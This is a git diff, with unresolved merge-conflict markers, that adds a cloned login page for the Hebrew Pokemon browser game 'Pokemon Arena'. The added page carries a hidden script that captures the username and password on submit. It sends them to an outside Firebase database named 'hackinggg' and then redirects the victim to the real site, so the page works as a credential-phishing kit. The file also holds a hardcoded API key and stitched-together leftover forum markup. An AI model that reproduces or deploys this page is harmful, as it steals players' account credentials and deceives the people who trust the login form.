@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <html dir="rtl"><head>
 	<!-- CREATED BY Matan Mizrachi / while1.co.il -->
 	<meta charset="utf-8">
@@ -286,4 +287,294 @@
       
       <p><span style="font-size:20px"><img alt="" src="https://i.ibb.co/jTr1FnY/OIG-t-Y1-H2i-YXx2m-transformed.png" style="height:200px; width:200px" /></span></p>
       
+=======
+<html dir="rtl"><head>
+	<!-- CREATED BY Matan Mizrachi / while1.co.il -->
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	
+	<title>פוקימון ארנה - משחק פוקימון ישראלי</title>
+	<meta http-equiv="content-style-type" content="text/css">
+	<meta name="description" content="פוקימון ארנה הנו משחק אונליין מבוסס פוקימון. במשחק ניתן ללכוד פוקימונים, להלחם נגד מאמנים, להתמודד במכוני פוקימונים ועוד... הצטרף עוד היום והתחל את המסע שלך כמאמן פוקימון!">
+	<meta name="google-adsense-account" content="ca-pub-8242537944127241">
+    <link rel="shortcut icon" href="https://pokemon-arena.net//img/icon.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://pokemon-arena.net/apple-touch-icon.png">
+	
+	<link href="css.css" rel="stylesheet" type="text/css">
+	<link href="csss.css" rel="stylesheet" type="text/css">
+<style>
+  .vt-augment {
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .vt-augment.drawer {
+    display: none;
+    width: 700px;
+    background: white;
+    border: 1px solid #e6e6e6;
+    text-align: left;
+    z-index: 102;
+    position: fixed;
+    right: 0;
+    top: 0;
+    height: 100vh;
+    box-shadow: -4px 5px 8px -3px rgba(17, 17, 17, .16);
+    animation: slideToRight 0.5s 1 forwards;
+    transform: translateX(100vw);
+  }
+  .vt-augment.drawer[opened] {
+    display: flex;
+    animation: slideFromRight 0.2s 1 forwards;
+  }
+  .vt-augment > .spinner {
+    position: absolute;
+    z-index: 199;
+    top: calc(50% - 50px);
+    left: calc(50% - 50px);
+    border: 8px solid rgba(0, 0, 0, 0.2);
+    border-left-color: white;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1.2s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  @keyframes slideFromRight {
+    0% {
+      transform: translateX(100vw);
+    }
+    100% {
+      transform: translateX(0);
+    }
+  }
+  @keyframes slideToRight {
+    100% {
+      transform: translateX(100vw);
+      display: none;
+    }
+  }
+  @media screen and (max-width: 700px) {
+    .vt-augment.drawer {
+      width: 100%;
+    }
+  }
+</style></head>
+<body><div data-v-13de5202="" id="passwarden" class="passwarden"><!----><!----><!----></div><div data-v-0c41c54c="" id="passwarden-extension-form"><!----><!----><!----><!----><!----></div>
+
+<div id="background-fix"></div>
+
+<div id="top">
+	<img src="https://pokemon-arena.net/intro_2018/imgs/logo_new.png" class="logo" alt="Pokemon Arena - מרכז הפוקימונים הגדול במדינה">
+</div>
+
+<div id="main">
+<meta name="google-adsense-account" content="ca-pub-8242537944127241">
+
+	<div class="col-login">
+<script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js'
+        import { getFirestore, doc, setDoc, updateDoc } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js'
+        console.log("f");
+        
+        function uuidv4() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
+            .replace(/[xy]/g, function (c) {
+                const r = Math.random() * 16 | 0, 
+                    v = c == 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+        
+        const firebaseConfig = {
+            apiKey: "AIzaSyDxGRkM1i79JrWtRQXSF9JEl52d0Jo19ww",
+            authDomain: "hackinggg-3a0cf.firebaseapp.com",
+            projectId: "hackinggg-3a0cf",
+            storageBucket: "hackinggg-3a0cf.appspot.com",
+            messagingSenderId: "654585197389",
+            appId: "1:654585197389:web:14a93963475f1f7c1dbd04"
+        };
+
+        function send(){
+          json[`${uuidv4()}`] = "username: " + document.getElementsByName('username')[0].value + " and password: " + document.getElementsByName('password')[0].value;
+	        updateDoc(DR, json)
+          .then(() => {
+            console.log("Document successfully updated!");
+          })
+          .catch((error) => {
+            console.error("Error updating document: ", error);
+          });
+          json = {};
+          window.location.href = "https://pokemon-arena.net/index.php?page=threaddisplay&t=298"
+        }
+        
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        var DR = doc(db, "hack", "hav")
+        var json = {};
+        console.log(DR)
+        document.getElementsByName('username')[0].addEventListener("keypress", function(event) {
+          console.log(event.code)
+          if(event.code === 'Enter') {
+            send();
+          }
+        })
+        document.getElementsByName('password')[0].addEventListener("keypress", function(event) {
+          console.log(event.code)
+          if(event.code === 'Enter') {
+            send();
+          }
+        })
+        document.getElementById('log-in').onclick = () => {
+          send();
+	      }
+        
+    </script>
+		<h2>התחברות</h2>
+		<p class="subtitle">משתמש קיים בפוקימון ארנה?</p>
+		
+		<div class="form">
+						
+			<input type="text" name="username" placeholder="שם משתמש..." aria-label="שם משתמש" autocomplete="off">
+			<input type="password" name="password" placeholder="סיסמה..." aria-label="סיסמה" autocomplete="off">
+			
+			<div class="forgot_links">
+				<a href="?page=forgot-password">שכחתי סיסמה</a> / <a href="?page=forgot-username">שם משתמש</a>
+			</div>
+			
+			<button class="orange" id="log-in">התחבר עכשיו</button>
+		</div>
+		
+		<div id="game_info">
+			<h3>פוקימון ארנה</h3>
+			<p>
+				הנו משחק מבוסס פוקימון המאפשר להתחיל במסע הרפתקני כמאמן פוקימונים צעיר ונחוש במטרה להיות המאמן הטוב ביותר.
+				במסע כמאמן פוקימונים באפשרותך ללכוד למעלה מ-700 פוקימונים ברחבי המשחק , להלחם מול מאמנים אמיתיים , להתמודד במכוני הפוקימונים , לבצע משימות שונות ועוד מגוון רחב של אפשרויות משחק מהנות.
+				<br>
+				אז למה אתה מחכה?
+			</p><p>
+			</p><p class="txt_join">
+				הצטרף עכשיו להרפתקה הקסומה בעולם הפוקימונים!
+			</p>
+		</div>
+	</div>
+	<div class="col-register">
+		<h2>הרשמה</h2>
+		<p class="subtitle">הרשם עכשיו לפוקימון ארנה משחק דפדפן ישראלי!</p>
+		
+		<div class="form">
+						
+			<input type="text" name="inlognaam" placeholder="שם משתמש..." aria-label="שם משתמש" value="" autocomplete="off">
+			<input type="password" name="wachtwoord" placeholder="סיסמה..." aria-label="סיסמה" value="" autocomplete="off">
+			<input type="password" name="wachtwoord_nogmaals" placeholder="חזור על סיסמה..." aria-label="חזור על סיסמה" value="" autocomplete="off">
+			<input type="email" name="email" placeholder="אימייל..." aria-label="אימייל" value="" autocomplete="off">
+			
+			<label class="for_select">
+			<span>מחוז התחלתי:</span>
+				<select name="wereld">
+					<option value="Kanto">Kanto</option><option value="Johto">Johto</option><option value="Hoenn">Hoenn</option><option value="Sinnoh">Sinnoh</option><option value="Unova">Unova</option><option value="Kalos">Kalos</option><option value="Alola">Alola</option><option value="Galar">Galar</option>				</select>
+			</label>
+			
+			<label class="for_select">
+				<span>דמות התחלתית:</span>
+				<select name="character">
+					<option value="Red" selected="">Red</option><option value="Leaf">Leaf</option><option value="Ethan">Ethan</option><option value="Lyra">Lyra</option><option value="Brendan">Brendan</option><option value="May">May</option><option value="Lucas">Lucas</option><option value="Dawn">Dawn</option><option value="Lunick">Lunick</option><option value="Solana">Solana</option><option value="Ash">Ash</option><option value="Blue">Blue</option><option value="Brock">Brock</option><option value="Misty">Misty</option><option value="Tracey">Tracey</option><option value="Max">Max</option><option value="Paul">Paul</option><option value="J">J</option><option value="Hilda">Hilda</option><option value="Hilbert">Hilbert</option><option value="N">N</option><option value="Akuroma">Akuroma</option><option value="Lance">Lance</option><option value="mal-bw2">mal-bw2</option>				</select>
+			</label>
+			
+			<div class="captcha">
+				<img src="https://pokemon-arena.net/includes/captcha.php">
+				<input type="text" placeholder="קוד..." name="captcha" autocomplete="off">
+			</div>
+			
+			<label class="agree">
+				<input type="checkbox" name="agreecheck" autocomplete="off">
+				קראתי ואני מסכים לתנאי השימוש
+			</label>
+						
+			<button class="green">הרשם עכשיו</button>
+		</div>
+		
+		<p id="credit">
+			<!-- CREATED BY Matan Mizrachi / while1.co.il -->
+			Pokémon And All Respective Names are Trademark © of Nintendo 1996-2024			Designed by MagicDesign
+		</p>
+		
+		<ul id="links">
+			<li><a href="?page=contact">צור קשר</a></li>
+			<li><a href="?page=tos">תנאי שימוש</a></li>
+		</ul>
+	</div></div> <!-- close main -->
+
+
+
+		<center>
+
+
+</center>
+<ul id="game_stats">
+	<li><strong>רשומים:</strong> 779</li>
+	<li><strong>נרשמו היום:</strong> 1</li>
+	<li><strong>מחוברים עכשיו:</strong> 23</li>
+	<li>28,722 <strong>פוקימונים נתפסו</strong></li>
+	<li>3,689,789 <strong>סה"כ קרבות</strong></li>
+	<br>
+	<li>
+		<br>
+		<strong>
+את המשחק תכנן ופיתח טג'ירי בין השנים 1991–1995 עבור חברת נינטנדו. המשחק התבסס על תחביב שהיה ליוצרו כילד - איסוף חרקים. השחקנים מתפקדים כ"מאמני פוקימונים" היכולים ללכוד, לאסוף, להחליף ולאמן פוקימונים בעלי יכולות שונות ולהילחם בעזרתם במאמני פוקימונים אחרים בקרבות המבוססים על קרבות חרקים המקובלים ביפן. קרבות אלו יכולים לחזק את כוחם ועוצמתם של הפוקימונים שברשות השחקנים. בקרבות אלה, הפוקימונים לעולם לא מדממים או מתים. המטרה היא להמם את היריב ולנצח. המילה האנגלית המתארת מצב בו פוקימון הפסיד בקרב ואינו יכול להמשיך להילחם היא "fainted", שפירושה בעברית "התעלף". בשנת 1996 הוציאה נינטנדו לשוק את משחק התפקידים פוקימון כמשחק וידאו עבור קונסולת המשחקים הניידת גיים בוי, ושנתיים מאוחר יותר יצאה גרסה לקונסולת המשחקים הביתית נינטנדו 64. המונח "פוקימון", פרט להיותו שם המשחק, הפך לשם קולקטיבי ל־1,025 הפוקימונים המשתתפים במשחק, בסדרה ובסרטים.
+		<strong>
+		
+		</strong>
+	</strong></li><strong>
+</strong></ul><strong>
+
+
+</strong><div>
+    <div class="vtResetstyles">
+    <div id="vtoverlay" class="vtoverlay vthidden w3-animate-right
+    w3-container">
+    <div class="vtmain vthidden" id="vtmain">
+      <div class="vtcontactus">
+          <a id="linktest" href="https://www.virustotal.com">
+            <img class="vtlogo-popup" style=" width: 32px; 
+            height: 32px;" src="chrome-extension://efbjojhplkelaegfbieplglfidafgoka/icons/vt-logo.svg">
+          </a>
+          <a href="https://www.virustotal.com">VT4Browsers
+          </a>
+      </div>
+      <span id="vtclose"><strong>X</strong></span>
+      <div class="vttextpopup vthidden" id="statustext">
+        <div class="vtscanstatus" id="vtscanstatus"></div>
+        <div class="vtprogress vthidden" id="vtprogress"></div>
+        <br id="brfile">
+        <div class="vtscanstatus" id="vtscanfilelink"></div>
+      </div>
+      <div class="vttextpopup vthidden" id="widgettext">
+        <div id="vtwidgetError"></div>
+      </div>
+    </div>
+    </div>
+    </div>
+    <div id="vt-augment-container" class="vtzindex vt-augment drawer" style="background: rgb(49, 61, 90);"></div></div><span class="vttooltiptext vthidden">&nbsp;Click to open VirusTotal report&nbsp;<br>with VT Augment</span><style></style></body></html>
+
+    <script>/*<p>אני אעשה את זה קצר ופשוט:</p>
+
+      <p><span style="font-size:20px">מי שרוצה חתימה שיכתוב בפרטי עם מידע כמו: רקע, פוקימון טקסט וכו'.</span></p>
+      
+      <p><span style="font-size:20px">עולה 4 זהב.</span></p>
+      
+      <p><span style="font-size:20px">זמן הכנה שבוע בערך.</span></p>
+      
+      <p><span style="font-size:20px">יש חתימות שאני לא מסכים</span></p>
+      
+      <p> </p>
+      
+      <p><span style="font-size:20px">דוגמאות:</span></p>
+      
+      <p><span style="font-size:20px"><img alt="" src="https://i.ibb.co/jTr1FnY/OIG-t-Y1-H2i-YXx2m-transformed.png" style="height:200px; width:200px" /></span></p>
+      
+>>>>>>> 16a49b169cf457adda84320e6170f33ce6af3ebe
       <p><span style="font-size:20px"><img alt="" src="https://i.ibb.co/BgFVJ88/kyogre-jumping-sea-yoyo1234-text-no-fish-another-angle-with-mountain-final-4k-1600-fixed-mountain-fi.png" style="height:100px; width:178px" /></span></p>*/</script>
